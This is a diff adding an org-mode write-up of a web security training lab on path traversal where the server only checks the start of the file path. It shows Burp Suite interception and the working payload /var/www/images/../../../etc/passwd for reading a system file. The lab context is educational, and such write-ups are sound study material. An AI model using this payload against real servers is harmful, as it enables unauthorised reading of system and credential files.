@@ -1,0 +1,33 @@
+#+title: File path traversal, validation of start of path
+
+* Table of Contents :toc:
+- [[#lab-contains][Lab Contains]]
+- [[#end-goal][End Goal]]
+- [[#solution][Solution]]
+  - [[#send-payload][Send Payload]]
+- [[#payload-to-solve-the-lab][Payload to solve the lab]]
+
+* Lab Contains
+- path traversal vulnerability in display of product images
+- transmits full file path via request parameter
+- validates the supplied path start with the expected folder
+
+* End Goal
+- retrieve contents of the ~/etc/passwd~
+* Solution
+- Access the lab
+- Open a product image on new tab of browser and intercept the request with proxy (burpsuite)
+- Send the request to repeater & observe
+- ~GET /image?filename=/var/www/images/31.jpg HTTP/2~
+- So in here we can see that filename parameter is using full path of the file
+  - Now we can try with full path to retrieve our ~passwd~ file contents
+  - Payload ~filename=/etc/passwd~
+** Send Payload
+- send this ~/etc/passwd~ payload and look at the response
+  - Server give ~400: bad request~ It says /"Missing parameter 'filename'"/
+*** Fix the error
+we can move upto directory of /etc and access ~passwd~ file
+- ~GET /image?filename=/var/www/images//../../../etc/passwd HTTP/2~
+- Success 200:OK
+* Payload to solve the lab
+~/var/www/images/../../../etc/passwd~
